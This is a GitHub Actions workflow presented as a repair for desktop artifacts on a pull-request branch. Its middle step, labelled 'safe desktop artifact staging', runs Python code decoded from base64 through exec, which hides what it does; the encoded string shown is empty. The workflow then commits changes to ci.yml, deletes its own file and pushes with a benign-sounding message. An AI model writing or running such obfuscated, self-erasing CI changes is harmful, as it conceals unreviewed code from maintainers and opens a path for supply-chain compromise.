name: Repair PR 796 desktop artifacts

on:
  push:
    branches:
      - fix/786-native-retirement-closure

concurrency:
  group: repair-pr796-desktop-artifacts-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: write

jobs:
  repair:
    runs-on: ubuntu-26.04
    timeout-minutes: 10
    steps:
      - name: Check out the PR branch
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          git init .
          git remote add origin "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
          git fetch --depth=1 origin "${GITHUB_REF_NAME}"
          git checkout -B "${GITHUB_REF_NAME}" FETCH_HEAD

      - name: Add safe desktop artifact staging
        run: |
          set -euo pipefail
          python3 -c "import base64; exec(compile(base64.b64decode(''), 'repair.py', 'exec'))"

      - name: Commit the repair
        run: |
          set -euo pipefail
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add .github/workflows/ci.yml
          git rm .github/workflows/repair-pr796-desktop-artifacts.yml
          git commit -m 'fix(ci): sanitize desktop artifacts'
          echo "REPAIR_COMMIT=$(git rev-parse HEAD)"
          echo "REPAIR_TREE=$(git rev-parse HEAD^{tree})"
          git push origin HEAD:"${GITHUB_REF_NAME}"
